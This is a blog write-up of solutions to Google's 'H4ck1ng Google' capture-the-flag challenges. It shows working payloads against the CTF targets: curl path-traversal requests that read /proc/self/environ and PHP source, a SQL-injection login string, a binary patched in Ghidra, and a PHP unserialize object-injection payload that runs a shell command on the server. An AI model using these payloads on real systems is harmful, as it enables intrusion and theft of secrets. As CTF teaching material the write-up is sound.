
+++
title = "\"H4ck1ng Google\" - Solving Google CTF challenges"
date = 2022-10-09
description = "My experiences solving the Google CTF challenges. I'll be covering the challenges I solved, the tools I used, and the techniques I used to solve them."

[taxonomies]
tags = ["ctf", "vulnerability", "security"]
+++

> **Note**: This post will contain spoilers for most of the challenges in the CTF. If you want to solve the challenges yourself, I recommend you to stop reading now.

# Introduction

[H4ck1ng Google](https://h4ck1ng.google/) is a CTF (capture-the-flag) challenge released by Google about a month ago. It involves solving various puzzles to get the flag, which for those inexperienced in CTFs is a string of characters that you need to find in order to solve the challenge. The challenges are divided into episodes with 3 challenges per each, numbered starting from `000`.

# Episode 000

## Challenge 01
We are given a single link to [https://hackerchess-web.h4ck.ctfcompetition.com/](https://hackerchess-web.h4ck.ctfcompetition.com/), which looks like an online chess game.

{% figure(src="ep0ch1-main.png", alt="An online chess game website.") %}
    The main page of the website.
{% end %}

If you try playing this chess game, you'll find that the AI on the other end actually cheats, making it impossible to win. Therefore, we've got to find a way to cheat as well.

There's a big, suspicious link in the bottom right titled "Master Login", always a good place to start. Clicking on it takes us to a simple login page, which we can try a couple of times with common passwords. No luck.

{% figure(src="ep0ch1-login.png", alt="A login page.") %}
    The login page.
{% end %}

The next thing is to look at the developer console for hints. Let's switch to the network tab and see how this chess game works.

When I press "Start", it looks as though the game sends out a POST request to `/load_board.php` with a payload of `filename=baseboard.fen`. This looks interesting, so let's try to change the filename to something else.

{% figure(src="ep0ch1-devtools-network.png", alt="The network tab of the developer console.") %}
    The network tab of the developer console.
{% end %}

We can use `curl` to send a request to the server and see what happens. 

> *Note*: From here on, there's multiple solutions, so for the sake of completeness, I'll be showing all of them.

### Solution 1 (environment variable exfiltration)

We know that the actual chess website is in `index.php`, so let's try getting that.

```bash
curl https://hackerchess-web.h4ck.ctfcompetition.com/load_board.php -d "filename=index.php"
```

{% figure(src="ep0ch1-indexphp.png", alt="The output of curl.") %}
    The output of curl. We can see that the server is sending us the contents of index.php!
{% end %}

Inspecting this file for the flag yields the following:

```php
if ($chess->inCheckmate()) {
    if ($chess->turn != "b") {
        echo '<h1>You lost! Game Over!</h1>';
    } else {
        echo "<h1>ZOMG How did you defeat my AI :(. You definitely cheated. Here's your flag: ". getenv('REDIRECT_FLAG') . "</h1>";
    }
}
```

Looks like the flag is in the `REDIRECT_FLAG` environment variable. Let's try to get that. We can use the same `curl` command as before, but this time we'll try to get the environment variables. (On Linux systems, environment variables are stored in `/proc/self/environ`.)

```bash
curl https://hackerchess-web.h4ck.ctfcompetition.com/load_board.php -d "filename=/proc/self/environ"
```

{% figure(src="ep0ch1-environ.png", alt="The output of curl.") %}
    The output of curl. We can see that the server is sending us the contents of /proc/self/environ!
{% end %}

Inspecting the output, we can see that the flag is in the `REDIRECT_FLAG` variable. (I won't be directly sharing the flag here to stop indexing bots from finding it.)

### Solution 2 (SQL injection)

This was the solution I found first, and it's (in my opinion) a bit more fun. We can use SQL injection to get the flag.

Let's take a look at `admin.php`:

```bash
curl https://hackerchess-web.h4ck.ctfcompetition.com/load_board.php -d "filename=admin.php"
```

{% figure(src="ep0ch1-adminphp.png", alt="The output of curl.") %}
    The output of curl, showing us the contents of admin.php.
{% end %}

The important part is the following:

```php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $query = sprintf("SELECT username FROM chess_ctf_admins WHERE username='%s' AND password='%s'", $_POST['username'], $_POST['password']);
    try {
        $result = $conn->query($query);
    } catch (mysqli_sql_exception $e) {
        echo($e);
    }
    ...
}
```

We can see that the server is using `sprintf` to format the SQL query. This means that we can inject SQL into the query, and the server will let us log in.

Let's go back to the login page and try to log in with the following credentials:

```
username: anything
password: ' OR 1=1; --
```

It works! We can see the configuration page for the chess game.

{% figure(src="ep0ch1-config.png", alt="The configuration page for the chess game.") %}
    The configuration page for the chess game.
{% end %}

Let's set thinking time to 1 and "AI Queen Cheats" to "Off". Now, go ahead and play the game again. You should be able to win, which will yield the flag.

## Challenge 02

We're given a link to [https://aurora-web.h4ck.ctfcompetition.com/](https://aurora-web.h4ck.ctfcompetition.com), which we're told is a log search tool.

{% figure(src="ep0ch2-main.png", alt="The main page of the log search tool.") %}
    The main page of the log search tool.
{% end %}

We can only search for a minimum of 4 characters, which is a bit annoying. Let's try to bypass this by checking the network requests again.

We can see a request to `https://aurora-web.h4ck.ctfcompetition.com/?file=hexdump.txt&term=aurora`. Let's try to change the `term` parameter to something shorter.

{% figure(src="ep0ch2-shortersearch.png", alt="A blank page.") %}
    A blank page. This is the result of a search for "aur".
{% end %}

Okay, so it looks like that strategy won't work. Let's try to find a way to get the flag by editing the `file` parameter instead. Keeping in mind our antics with the chess game, we can try to get the contents of `/proc/self/environ`. But we also must think of a search term that will return a result. Let's try `USER`, because that's a common environment variable.

{% figure(src="ep0ch2-environ.png", alt="Getting /proc/self/environ") %}
    The contents of `/proc/self/environ` (I've blanked out my IP address).
{% end %}

Unfortunately, there's no flag to be seen. However, we now know that we can access any file in the system we want, so let's try an obvious one: `/flag`. Again, we search for a term that we know will yield results - in this case, `solve` since it's in all the flags.

{% figure(src="ep0ch2-flag.png", alt="Getting /flag") %}
    The contents of `/flag`.
{% end %}

And there we have it! The flag is returned to us.

# Episode 001

## Challenge 1

This challenge involves binary inspection and exploitation. We're given these files:
- `wannacry`
- `flag`

The first step is figuring out what we've actually been given. We can use `file` to determine the file type of `wannacry` and `flag`.

```bash
$ file wannacry
wannacry: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=IGPSbKhPf45BQqlR84-9/XWC3eVS4fozNp9uK4nDp/_Styn3U-Z8S6ExnY6QOR/RTzNS5QnFmUHeSBeyHIu, with debug_info, not stripped

$ file flag
flag: OpenPGP Secret Key
```

We can see that `wannacry` is a 64-bit ELF executable, and `flag` is an OpenPGP secret key. Let's take a look at `wannacry` first.

### Binary inspection
First, let's run this binary. I used a server on [repl.it](https://repl.it), just because I have an M1 Mac and this is a x86-64 binary. Also, it's probably best practice to run binaries in a sandboxed environment.

```bash
$ ./wannacry
Usage of ./wannacry:
  -encrypted_file string
        File name to decrypt.
  -key_file string
        File name of the private key.
```

Great! So we've confirmed what `file` told us - this challenge has something to do with cryptography. 

Let's take a look at the contents of the binary itself. While executable binaries are usually stripped, this one isn't. We can use `strings` to take a look at whatever readable strings are in the binary.

```bash
$ strings wannacry
...
<long list of strings>
```

It's a bit hard to read, so let's pipe the output to `grep` and search for some keywords.

```bash
$ strings wannacry | grep "flag"
<nothing useful>

$ strings wannacry | grep "key"
...
Keys are here:
https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/
...
```

Great! Looks like we have a URL to check out. Let's take a look at it.

{% figure(src="ep1ch1-keys.png", alt="The keys page.") %}
    The keys page.
{% end %}

Looks like a lot of `.pem` files. It seems clear that what we need to do is decrypt the flag using one of these keys. 

Here's a simple script to download all the keys, then decrypt the flag using each one. (Let's assume the flag contains `solve` like before).

```bash
#!/bin/bash

wget -r "https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/"

for key in $(ls wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/*.pem); do
    echo "Trying $key"
    ./wannacry -key_file $key -encrypted_file flag | grep "solve"
done
```

And we get the flag!

## Challenge 2

This challenge involves some reverse-engineering. Let's take a look at the file we're given:
```bash
$ file wannacry
wannacry: ELF shared object, 64-bit LSB x86-64, dynamic (/lib64/ld-linux-x86-64.so.2), BuildID=0c23340ab6c6d0c158f0ee356a1deb0253d8cf4c, not stripped

$ ./wannacry
<no output>
```

Looks like another binary, with a slightly different structure. Let's try the same strategy as last time to see if we can find any useful strings.

```bash
$ strings wannacry
...
abacus
abdomen
abdominal
abide
...
zoologist
zoology
zoom
https://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com//
```

Looks like we have another URL to check out. Let's take a look at it.

{% figure(src="ep1ch2-princess.png", alt="A website that says 'our princess is in another castle'.") %}
    The killswitch page.
{% end %}

No luck! But our other discovery, the wordlist, tells us that this is probably some type of passcode-generating program.

At this point, we need to reverse-engineer the binary as command-line tools can only give us so much. I used [Ghidra](https://ghidra-sre.org/) to do this.

> Note: I've never used Ghidra before, so I'm not sure if this is the best way to do this. If you know of a better way, please let me know! (And don't use this as a guide to how to use Ghidra.)


### Reverse-engineering with Ghidra
I opened a new project in Ghidra, and imported the `wannacry` binary. I looked through the available functions until I found the `main` one - the one that's executed when the program is called.

{% figure(src="ep1ch2-ghidramain.png", alt="The main function.") %}
    The main function.
{% end %}

All of this code is in Assembly, so it's a bit hard to read. But the gist seems to be that the whole program uses the current timestamp to generate a passcode based upon the wordlist, and some cryptographic functions. It also doesn't seem like this program takes any input, so I wasn't sure how to actually get the generated passcode.

However, I did notice that there's another function called `print` that is never called - you can verify this through the "Show References" option in the right-click menu.

{% figure(src="ep1ch2-ghidraprint.png", alt="The print function.") %}
    The print function. You can see that there's no `CALL` to this function.
{% end %}

So, I looked it up and learnt how to patch instructions in Ghidra. Then, I went back to `main` and patched the instruction at index `0012f88` to `CALL print`.

> Note: I'm patching this specific line because it was the first one that worked after a couple of tries with different ones.

{% figure(src="ep1ch2-patching.png", alt="Patching the instruction.") %}
    Patching the instruction. I've no clue what the hex code dropdown values mean, but I just chose the green ones.
{% end %}

I then exported the program as a **ELF binary** (not a shared object), and ran it.

```bash
$ ./wannacry-patched
https://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com//almanacSegmentation fault (core dumped)
```

And we get the flag! (And a segfault, but that's fine.)

> Note: This flag won't work right now, because it's timestamp-based. But you can follow the same steps to get the flag for the current timestamp.

## Challenge 3

Back to a familiar screen - the chess challenge. But this time there's no conspicuous admin page, so more investigation is required.

It seems that the same method of source code exfiltration from the very first challenge still works, so let's try it here (Note: the domain has changed).

```bash
$ curl https://hackerchess2-web.h4ck.ctfcompetition.com/load_board.php -d "filename=index.php"
Loading Fen: <?php
session_save_path('/mnt/disks/sessions');
session_start();
...
```

It still works, so chances are that this is what we'll need to solve the problem. Looking at the source code, we see a lot of interesting stuff, including the below:

```php
if ($chess->inCheckmate()) {
    if ($chess->turn != "b") {
        echo '<h1>You lost! Game Over!</h1>';
    } else {
        echo "<h1>Winning against me won't help anymore. You need to get the flag from my envs." . "</h1>";
    }
}
```

It seems that there's no use in winning against the chess engine, so we need to find a way to get the flag from the environment variables. Can we use the same method that we used in the first challenge?

```bash
$ curl https://hackerchess2-web.h4ck.ctfcompetition.com/load_board.php -d "filename=../../../../../../proc/self/environ"
unsupported board
```

Nope! Looks like the `load_board.php` file has been patched. We can check this by looking at the source code of the file.

```bash
$ curl https://hackerchess2-web.h4ck.ctfcompetition.com/load_board.php -d "filename=load_board.php"
...
$allowed = array('fen', 'php', 'html');
$filename = $_POST['filename'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);
if (!in_array($ext, $allowed)) {
    die('unsupported board');
}
```

> Note: the shoddy validation in this code implies that a [PHP `pathinfo` bypass](https://forums.hak5.org/topic/39958-bypassing-pathinfo-or-getimagesize-php-shell-upload/) would be possible, but I couldn't get it to work. If you know how to do this, please let me know!

Okay, so we can only request files that end in `.fen`, `.php`, or `.html`. Let's get back to index.php and see if we can find anything useful.

I noticed a lot of `DEBUG` statements, which I thought were interesting because it was unlikely that they would be left in the final code except as a clue. Then, I found this code:

```php
$movei = unserialize(base64_decode($_GET['move_end']));
if ($chess->turn == "b") {
    #XXX: this should never happen.
    $chess = init_chess();
    $_SESSION['board'] = serialize($chess);
    die('Invalid Board state. Refresh the page');
}
echo "<!-- XXX : Debug remove this ".$movei. "-->";
```

Can you guess which of these lines is critical to getting the flag? It's actually the `unserialize` one. It turns out that PHP, when unserializing a string, can actually overwrite classes which have been defined already. 

This is called a [PHP `unserialize` vulnerability](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection), and it means that it's crucial that user-supplied input is never directly unserialized, which is exactly what's happening here.

Through reading the `index.php` code, I noticed that the class `Stockfish` has a public variable `$binary` that later gets executed directly.

```php
class Stockfish
{
    ...
    public $binary = "/usr/games/stockfish";
    ...
    public function __wakeup()
    {
        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
        echo '<!--'.'wakeupcalled'.fgets($this->pipes[1], 4096).'-->';
    }
}
```

So, if we overwrite the `$binary` variable with our own, it seems like the server will just execute whatever command we want.

Now, using [this website](http://php.fnlist.com/php/serialize), I generated the below payload, which we will Base64 encode and then use it as the `?move_end` parameter.

```php
//  -- Class --       -variable-     ---- binary to execute ---
O:9:"Stockfish":1:{s:6:"binary";s:22:"cat /proc/self/environ";}}
```

{% figure(src="ep1ch3-success.png", alt="Website source code") %}
    Done! The command's output is put in a comment in the source code of the page we get, and the flag is clearly visible.
{% end %}

And we get the flag!